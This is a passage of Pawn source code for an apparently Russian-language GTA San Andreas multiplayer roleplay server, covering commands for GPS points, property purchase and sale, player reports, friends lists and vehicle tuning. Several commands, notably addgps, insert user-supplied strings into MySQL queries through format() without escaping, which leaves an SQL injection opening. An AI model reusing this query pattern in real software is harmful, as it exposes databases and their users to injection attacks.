CMD:addgps(playerid,params[])
{
    if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return 1;
    new list;
    if(sscanf(params, "ds[40]",list,params))
	{
	    SendClientMessage(playerid, CGREY, "1 - основное | 2 - базы организаций | 3 - работы | 4 - авторынки | 5 - развлечения | 6 - дальнобойщики");
		return SendClientMessage(playerid, CGREY, "Введите: /addgps [лист] [название]");
	}
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	query = "";
    format(query, sizeof(query), "INSERT INTO gps (`x`,`y`,`z`,`list`,`name`) VALUES ( '%f', '%f', '%f','%d','%s')",
	x,y,z,list,params);
	mysql_tquery(mysql,query);
    return SendClientMessage(playerid, CGREY, "Вы добавили новое место в GPS!");
}
CMD:eat(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
	if(GetPVarInt(playerid,"Burger1") > 0)
	{
	    DeletePVar(playerid,"Burger1");
	    SetPlayerSpecialAction(playerid,0);
    	ApplyAnimation(playerid,"VENDING","VEND_EAT1_P",4.1,0,1,1,1,1,1);
    	if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
		GiveGolod(playerid,GetPVarInt(playerid,"Golod"));
		new Float:slx, Float:sly, Float:slz;
		GetPlayerPos(playerid,slx,sly,slz);
		PlayerPlaySound(playerid, 32200, slx, sly, slz+5);
		if(PlayerInfo[playerid][pGolod] > 100) SetGolod(playerid,100);
    }
	return true;
}
CMD:buyhouse(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
    //if(PlayerInfo[playerid][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Покупка со 2 уровня");
	if(GetPVarInt(playerid,"PHOUSE") == 0) return SendClientMessage(playerid,CGREY,"Вы не в доме");
	if(!strcmp(HInfo[GetPVarInt(playerid,"PHOUSE")][hOwner], "None", true))
	{
		static const fmt_string1[] = "{FFFFFF}Класс дома:\t%s\nЦена:\t\t$%i\n\nВы действительно хотите купить данный дом?";
		new str1[sizeof(fmt_string1)+32+4];
		format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PHOUSE")][hClass],HInfo[GetPVarInt(playerid,"PHOUSE")][hCost]);
		ShowPlayerDialog(playerid,54,DIALOG_STYLE_MSGBOX,"Покупка",str1,"Да","Нет");
	}
	else SendClientMessage(playerid,CGREY,"Данный бизнес занят");
	return true;
}
CMD:buybiz(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
    //if(PlayerInfo[playerid][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Покупка со 2 уровня");
	new i = GetPVarInt(playerid,"PBIZ");
    if(IsPlayerInRangeOfPoint(playerid,5.0,BizInfo[i][bXX],BizInfo[i][bYY],BizInfo[i][bZZ]))
	{
		if(!strcmp(BizInfo[i][bOwner], "None", true))
		{
   			static const fmt_string1[] = "{FFFFFF}Название:\t%s\nЦена:\t\t$%i\n\nВы действительно хотите купить данный бизнес?";
			new str1[sizeof(fmt_string1)+32+4];
			format(str1, sizeof(str1), fmt_string1,BizInfo[i][bName],BizInfo[i][bPrice]);
			ShowPlayerDialog(playerid,53,DIALOG_STYLE_MSGBOX,"Покупка",str1,"Да","Нет");
			SetPVarInt(playerid,"Biz",i);
		}
		else SendClientMessage(playerid,CGREY,"Данный бизнес занят");
	}
	else SendClientMessage(playerid,CGREY,"Вы не в бизнесе!");
	return true;
}

CMD:rep(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(GetPVarInt(playerid,"AntiFlood8") > gettime())
	{
	    new str[60];
	    format(str,sizeof(str),"Писать в репорт и задать вопрос вы сможете через %d сек.",GetPVarInt(playerid,"AntiFlood8")-gettime());
		return SendClientMessage(playerid,CGREY,str);
	}
	if(sscanf(params, "s[150]", params)) return SendClientMessage(playerid, CGREY, "Введите: /rep [жалоба]");
	static const fmt_str[] = "[A] Репорт от {FFFFFF}%s[id %d]:{D50000} %s";
	new str[sizeof(fmt_str)+32+4+150];
	format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pSendername],playerid,params);
	SendAdminMessage(CLIGHTRED,str);
	SendClientMessage(playerid,CREWARD,"Ваше сообщение отправлено администрации");
	SetPVarInt(playerid,"AntiFlood8",gettime() + 60);
	return true;
}
CMD:ask(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(GetPVarInt(playerid,"AntiFlood8") > gettime())
	{
	    new str[60];
	    format(str,sizeof(str),"Писать в репорт и задать вопрос вы сможете через %d сек.",GetPVarInt(playerid,"AntiFlood8")-gettime());
		return SendClientMessage(playerid,CGREY,str);
	}
	if(sscanf(params, "s[150]", params)) return SendClientMessage(playerid, CGREY, "Введите: /ask [вопрос]");
 	if(PlayerInfo[playerid][pHMuted] != 0)
 	{
		static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pHMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
 	}
	static const fmt_str[] = "[A] Вопрос от {FFFFFF}%s[id %d]:{D50000} %s";
	new str[sizeof(fmt_str)+32+4+150];
 	format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pSendername],playerid,params);
 	SendAdminMessage(CLIGHTRED,str);
	SendClientMessage(playerid,CREWARD,"Ваше вопрос отправлен команде поддержки");
	SetPVarInt(playerid,"Vopros",gettime() + 180);
	SetPVarInt(playerid,"AntiFlood8",gettime() + 60);
	SetTimerEx("Voprs",180000,false,"i",playerid);
	return true;
}
CMD:sellbiz(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPlayerBiz(playerid))
    {
	    if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Введите: /sellbiz [id] [цена]");
	    new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	    //if(PlayerInfo[params[0]][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Покупка со 2 уровня");
	    if(params[1] < 1 || params[1] > 10000000) return SendClientMessage(playerid,CGREY,"Вы не можете продать бизнес меньше чем за $1");
		if(GetPlayerBiz(params[0])) return SendClientMessage(playerid,CGREY,"У Игрока есть бизнес");
		static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать свой бизнес?\nВы получите:{f7ae11}\n$%i{FFFFFF}\nОтдадите:\n{f7ae11}%s";
		new str2[sizeof(fmt_string2)+32+10];
		format(str2, sizeof(str2), fmt_string2,params[1],BizInfo[GetPVarInt(playerid,"PlayerBiz")][bName]);
		ShowPlayerDialog(playerid,145,DIALOG_STYLE_MSGBOX,"Продажа бизнеса",str2,"Да","Нет");
		SetPVarInt(playerid,"CBid",params[0]);
		SetPVarInt(playerid,"CBcena",params[1]);
    }
    else SendClientMessage(playerid,CGREY,"Вы не имеете бизнеса");
	return true;
}
CMD:changebiz(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPlayerBiz(playerid))
    {
	    if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Введите: /changebiz [id] [доплата]");
	    new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	    if(params[1] < 1 || params[1] > 10000000) return SendClientMessage(playerid,CGREY,"Вы не можете обменять бизнес меньше чем за $1");
		if(!GetPlayerBiz(params[0])) return SendClientMessage(playerid,CGREY,"Игрок не владеет бизнесом!");
		static const fmt_string2[] = "{FFFFFF}Вы действительно хотите обменять свой бизнес?\nВы получите:{f7ae11}\n$%i\n%s{FFFFFF}\nОтдадите:\n{f7ae11}%s";
		new str2[sizeof(fmt_string2)+32+10];
		format(str2, sizeof(str2), fmt_string2,params[1],BizInfo[GetPVarInt(params[0],"PlayerBiz")][bName],BizInfo[GetPVarInt(playerid,"PlayerBiz")][bName]);
		ShowPlayerDialog(playerid,143,DIALOG_STYLE_MSGBOX,"Обмен бизнеса",str2,"Да","Нет");
		SetPVarInt(playerid,"CBid",params[0]);
		SetPVarInt(playerid,"CBcena",params[1]);
    }
    else SendClientMessage(playerid,CGREY,"Вы не имеете бизнеса");
	return true;
}

CMD:gguns(playerid, params[]) return Kick(playerid, FIX_FUNCTION, 1200);
CMD:wepcrasher(playerid, params[]) return Kick(playerid, FIX_FUNCTION, 1200);
CMD:setint(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6|| AdminLogged[playerid] == false ) return true;
	if(!GetPVarInt(playerid,"PHOUSE")) return SendClientMessage(playerid,CGREY,"Вы не в доме");
    SetPVarInt(playerid,"ChangeInt",1);
    SetPlayerPos(playerid, spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][0], spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][1], spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][2]);
	SetPlayerInterior(playerid, spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_INT]);
	return ShowMenuForPlayer(Inta,playerid);
}
CMD:sethouse(playerid,params[])
{
    if(FD1 || FD2)
    {
		if(PlayerLogged[playerid] == false) return true;
		if(PlayerInfo[playerid][pAdmin] < 6|| AdminLogged[playerid] == false ) return true;
		if(sscanf(params, "is[5]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Введите: /sethouse [цена] [класс (A,B,C,D)]");
		new Float:x,Float:y,Float:z;
		GetPlayerPos(playerid,x,y,z);
		format(housez,sizeof(housez),"%f,%f,%f,%s,%i",x,y,z,params[1],params[0]);
		SetPlayerPos(playerid, spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][0], spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][1], spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][2]);
		SetPlayerInterior(playerid, spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_INT]);
		ShowMenuForPlayer(Inta,playerid);
	}
	return true;
}
CMD:sethousepos(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /sethousepos [id]");
    new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	HInfo[params[0]][hX]= x;
	HInfo[params[0]][hY]= y;
	HInfo[params[0]][hZ]= z;
	DestroyDynamicPickup(HInfo[params[0]][hPick]);
	HInfo[params[0]][hPick] = CreateDynamicPickup(1273,23,HInfo[params[0]][hX],HInfo[params[0]][hY],HInfo[params[0]][hZ],0);
	query = "";
	format(query, sizeof(query), "UPDATE testhouse SET 	hEntrx ='%f',hEntry ='%f',hEntrz ='%f' WHERE id = '%d' LIMIT 1",x,y,z,params[0]);
	mysql_tquery(mysql,query);
	return 1;
}
CMD:setbizpos(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /setbizpos [id]");
    new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	BizInfo[params[0]][bX]= x;
	BizInfo[params[0]][bY]= y;
	BizInfo[params[0]][bZ]= z;
	BizInfo[params[0]][bXX1]= x;
	BizInfo[params[0]][bYY1]= y;
	BizInfo[params[0]][bZZ1]= z;
	DestroyDynamicPickup(BIZPIC[params[0]]);
	BIZPIC[params[0]] = CreateDynamicPickup(19132,23,BizInfo[params[0]][bX],BizInfo[params[0]][bY],BizInfo[params[0]][bZ],0);
	query = "";
	format(query, sizeof(query), "UPDATE biz SET x ='%f',y ='%f',z ='%f',xx1 ='%f',yy1 ='%f',zz1 ='%f' WHERE id = '%d' LIMIT 1",x,y,z,x,y,z,params[0]);
	mysql_tquery(mysql,query);
	return 1;
}
function ShowFriends(playerid)
{
	new rows = cache_get_row_count(mysql);
	query = "";
	strcat(query, "{FFFFFF}За каждого приглашенного друга, получившего 2 уровень, Вы получаете 2.500$\nВы пригласили:\n\n");
	if(rows > 0)
	{
	    new sos[32],sos1;
	    static const fmt_string1[] = "%s | Уровень: %d\n";
		new str1[sizeof(fmt_string1)+32+5];
		for(new row = 1; row<= rows; row++)
		{
            cache_get_field_content(row-1, "name", sos, mysql);
            sos1 = cache_get_field_content_int(row-1, "level", mysql);
            
			format(str1, sizeof(str1), fmt_string1,sos,sos1);
			strcat(query,str1);
		}
	}
	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Друзья",query,"Закрыть","");
	return 1;
}
CMD:friends(playerid)
{
	if(PlayerLogged[playerid] == false) return true;
	query = "";
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE priglas = '%s'", PlayerInfo[playerid][pSendername]);
	mysql_tquery(mysql, query, "ShowFriends", "d", playerid);
/*	new stt[500];
	strcat(stt, "{FFFFFF}За каждого приглашенного друга, получившего 2 уровень, Вы получаете 2.500$\nВы пригласили:\n\n");
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE priglas = '%s'", PlayerInfo[playerid][pSendername]);
	mysql_tquery(mysql,query);
	mysql_store_result();
 	if(mysql_num_rows() > 0)
  	{
		for(new i = 1; i <= mysql_num_rows();i++)
		{
		    mysql_fetch_row(query);
		    new sos[32],sos1[5];
			mysql_get_field("name", sos);
			mysql_get_field("level", sos1);
			static const fmt_string1[] = "%s | Уровень: %s\n";
			new str1[sizeof(fmt_string1)+32+5];
			format(str1, sizeof(str1), fmt_string1,sos,sos1);
			strcat(stt,str1);
		}
		mysql_free_result();
	}
	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Друзья",stt,"Закрыть","");*/
	return true;
}
CMD:gogog(playerid)
{
    new carid = GetPlayerVehicleID(playerid);
	SetVehiclePos(carid,614.8181,-123.9917,997.6736);
	SetVehicleZAngle(carid,88.9452);
	LinkVehicleToInterior(carid,3);
	SetVehicleVirtualWorld(carid,playerid);
	SetPlayerVirtualWorld(playerid,playerid);
	SetPlayerInterior(playerid,3);
	PutPlayerInVehicle(playerid,carid,0);
	return 1;
}//{F85A5A}Закрыт"):("{20BA09}Открыт
CMD:tuning(playerid, params[])
{
	if(IsPlayerInAnyVehicle(playerid))
	{
	    if(!IsPlayerInRangeOfPoint(playerid, 3.0,2309.8481,1795.1025,10.8203)) return SendClientMessage(playerid,CGREY,"Вы не около тюнинга");
	   	new kek1 = 0;
		for(new v = 1; v <= TOTALV; v++)
		{
		    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
			if(GetPlayerVehicleID(playerid) != VInfo[v][vcar]) continue;
  			if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0)
  			{
				kek1 = v;
				break;
			}
			if(PlayerInfo[playerid][pFam] > 0 && VInfo[v][vfam] == PlayerInfo[playerid][pFam])
			{
				kek1 = v+1000;
				break;
			}
		}
		if(kek1 == 0) return SendClientMessage(playerid,CGREY,"Данный транспорт нельзя затюнинговать");
		if(kek1 >= 1000)
		{
			if(!FamInfo[PlayerInfo[playerid][pFam]][fUl][3]) return SendClientMessage(playerid,CGREY,"У Вашей семьи нет улучшения для тюнинга");
		}
		TogglePlayerControllable(playerid, 0);
		new carid = GetPlayerVehicleID(playerid);
		SetVehiclePos(carid,-1.4070, -6.0639, 1999.8468);
		SetVehicleZAngle(carid, 150.0000);
		LinkVehicleToInterior(carid,6);
		SetVehicleVirtualWorld(carid,playerid+10);
		SetPlayerVirtualWorld(playerid,playerid+10);
		SetPlayerInterior(playerid,6);
		PutPlayerInVehicle(playerid,carid,0);
		SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
		SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);

		ShowTuning(playerid);
		SetPVarInt(playerid,"STO",1);
	}
	else SendClientMessage(playerid, CGREY, "Вы не в машине");
 	return 1;
}

stock ShowTuning(playerid)
{
    SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
	SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);
	for(new i = 0; i < 33; i++) TextDrawShowForPlayer(playerid,Tuning[i]);
	TuningP[0][playerid] = CreatePlayerTextDraw(playerid, 165.500030, 120.625900, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[0][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[0][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[0][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[0][playerid], -1);
	PlayerTextDrawUseBox(playerid, TuningP[0][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[0][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[0][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[0][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[0][playerid], true);

	TuningP[1][playerid] = CreatePlayerTextDraw(playerid, 138.000045, 120.711090, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[1][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[1][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[1][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[1][playerid], 255);
	PlayerTextDrawUseBox(playerid, TuningP[1][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[1][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[1][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[1][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[1][playerid], true);

	TuningP[2][playerid] = CreatePlayerTextDraw(playerid, 138.000045, 152.211090, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[2][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[2][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[2][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[2][playerid], -1276806657);
	PlayerTextDrawUseBox(playerid, TuningP[2][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[2][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[2][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[2][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[2][playerid], true);

	TuningP[3][playerid] = CreatePlayerTextDraw(playerid, 165.500045, 152.211090, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[3][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[3][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[3][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[3][playerid], -551788033);
	PlayerTextDrawUseBox(playerid, TuningP[3][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[3][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[3][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[3][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[3][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[3][playerid], true);

	TuningP[4][playerid] = CreatePlayerTextDraw(playerid, 138.000030, 183.333297, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[4][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[4][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[4][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[4][playerid], -4119041);
	PlayerTextDrawUseBox(playerid, TuningP[4][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[4][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[4][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[4][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[4][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[4][playerid], true);

	TuningP[5][playerid] = CreatePlayerTextDraw(playerid, 165.666702, 183.333297, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[5][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[5][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[5][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[5][playerid], -9174785);
	PlayerTextDrawUseBox(playerid, TuningP[5][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[5][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[5][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[5][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[5][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[5][playerid], true);

	TuningP[6][playerid] = CreatePlayerTextDraw(playerid, 138.000045, 214.125900, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[6][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[6][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[6][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[6][playerid], -21364737);
	PlayerTextDrawUseBox(playerid, TuningP[6][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[6][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[6][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[6][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[6][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[6][playerid], true);

	TuningP[7][playerid] = CreatePlayerTextDraw(playerid, 165.666732, 214.125930, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[7][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[7][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[7][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[7][playerid], 1066973951);
	PlayerTextDrawUseBox(playerid, TuningP[7][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[7][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[7][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[7][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[7][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[7][playerid], true);

	TuningP[8][playerid] = CreatePlayerTextDraw(playerid, 138.000076, 245.333374, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[8][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[8][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[8][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[8][playerid], 8388863);
	PlayerTextDrawUseBox(playerid, TuningP[8][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[8][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[8][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[8][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[8][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[8][playerid], true);

	TuningP[9][playerid] = CreatePlayerTextDraw(playerid, 165.666732, 245.333374, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[9][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[9][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[9][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[9][playerid], -1523963137);
	PlayerTextDrawUseBox(playerid, TuningP[9][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[9][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[9][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[9][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[9][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[9][playerid], true);

	TuningP[10][playerid] = CreatePlayerTextDraw(playerid, 138.000061, 276.540771, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[10][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[10][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[10][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[10][playerid], -257124865);
	PlayerTextDrawUseBox(playerid, TuningP[10][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[10][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[10][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[10][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[10][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[10][playerid], true);

	TuningP[11][playerid] = CreatePlayerTextDraw(playerid, 165.666702, 276.540771, "LD_SPAC:white"); // box with color
	PlayerTextDrawLetterSize(playerid, TuningP[11][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[11][playerid], 23.833328, 27.377792);
	PlayerTextDrawAlignment(playerid, TuningP[11][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[11][playerid], -2147483393);
	PlayerTextDrawUseBox(playerid, TuningP[11][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[11][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[11][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[11][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[11][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[11][playerid], true);

	TuningP[12][playerid] = CreatePlayerTextDraw(playerid, 137.833328, 311.877685, "LD_SPAC:white"); // box prev color
	PlayerTextDrawLetterSize(playerid, TuningP[12][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[12][playerid], 24.333362, 11.614765);
	PlayerTextDrawAlignment(playerid, TuningP[12][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[12][playerid], 623191551);
	PlayerTextDrawUseBox(playerid, TuningP[12][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[12][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[12][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[12][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[12][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[12][playerid], true);

	TuningP[13][playerid] = CreatePlayerTextDraw(playerid, 165.333358, 311.773834, "LD_SPAC:white"); // box next color
	PlayerTextDrawLetterSize(playerid, TuningP[13][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningP[13][playerid], 24.000028, 11.614765);
	PlayerTextDrawAlignment(playerid, TuningP[13][playerid], 1);
	PlayerTextDrawColor(playerid, TuningP[13][playerid], 623191551);
	PlayerTextDrawUseBox(playerid, TuningP[13][playerid], true);
	PlayerTextDrawBoxColor(playerid, TuningP[13][playerid], 255);
	PlayerTextDrawSetShadow(playerid, TuningP[13][playerid], 0);
	PlayerTextDrawSetOutline(playerid, TuningP[13][playerid], 0);
	PlayerTextDrawFont(playerid, TuningP[13][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, TuningP[13][playerid], true);
	
	for(new i = 0; i < 14; i++) PlayerTextDrawShow(playerid,TuningP[i][playerid]);
	SendClientMessage(playerid,CGREY,"Для закрытия тюнинга используйте кнопку 'ESC'");
    SelectTextDraw(playerid, 0xFFCC0000);
    
    return 1;
//	return ShowPlayerDialog(playerid,268,DIALOG_STYLE_LIST,"Тюнинг","Цвет\nВинил\nДиски\nАзот\nГидравлика\nКапот\nВентиляция\nФары\nВыхлоп\nКрыша\nПередний бампер\nЗадний бампер\nБоковые юбки\nСпойлер\nРешетки\nСистема безопстности\nВыход","Далее","Назад");
}
CMD:tc(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /tc [id]");
	if(params[0] == playerid) return SendClientMessage(playerid, CGREY, "Вы не можете принять вызов у себя");
    if(GetPVarInt(params[0],"GoViz") == 0) return SendClientMessage(playerid, CGREY, "Игрок не вызывал никого");
	if(GetPVarInt(params[0],"GoViz") == 1 && !IsACop(playerid)) return SendClientMessage(playerid, CGREY, "Вы не можете принять данный вызов");
	else if(GetPVarInt(params[0],"GoViz") == 2 && PlayerInfo[playerid][pMember] != F_HOSPITAL_LS) return SendClientMessage(playerid, CGREY, "Вы не можете принять данный вызов");
	else if(GetPVarInt(params[0],"GoViz") == 3 && GetPVarInt(playerid,"Taxist") == 0) return SendClientMessage(playerid, CGREY, "Вы не можете принять данный вызов");
